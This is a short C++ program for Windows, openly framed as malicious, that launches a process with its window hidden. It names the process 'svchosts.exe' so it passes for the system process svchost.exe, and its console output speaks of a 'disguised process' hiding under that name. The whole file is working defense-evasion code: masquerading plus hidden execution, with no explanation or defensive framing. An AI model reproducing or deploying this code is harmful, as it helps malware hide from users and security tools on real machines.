#include <iostream>
#include <windows.h>
#include <string>

BOOL CreateMaliciousProcess(const std::string& processName, PROCESS_INFORMATION* pi) {
    
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; 

    char commandLine[MAX_PATH];
    strcpy_s(commandLine, processName.c_str());

    return CreateProcessA(
        NULL,              
        commandLine,       
        NULL,              
        NULL,              
        FALSE,             
        0,                 
        NULL,              
        NULL,              
        &si,               
        pi                 
    );
}

int main() {
    std::string maliciousProcessName = "svchosts.exe"; 
    
    PROCESS_INFORMATION pi;
    
    std::cout << "[INFO] Attempting to launch disguised process: " << maliciousProcessName << "..." << std::endl;
    
    if (CreateMaliciousProcess(maliciousProcessName, &pi)) {
        std::cout << "[SUCCESS] Process created successfully." << std::endl;
        std::cout << "  -> PID: " << pi.dwProcessId << std::endl;
        std::cout << "  -> Hiding under process name: " << maliciousProcessName << std::endl;
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        std::cout << "[ERROR] Failed to create process " << maliciousProcessName << "." << std::endl;
        std::cout << "  -> Error code: " << GetLastError() << std::endl;
        std::cout << "[NOTE] Ensure a file named '" << maliciousProcessName << "' exists in the current directory for testing." << std::endl;
    }

    std::cout << "Press Enter to exit...";
    std::cin.get();
    
    return 0;
}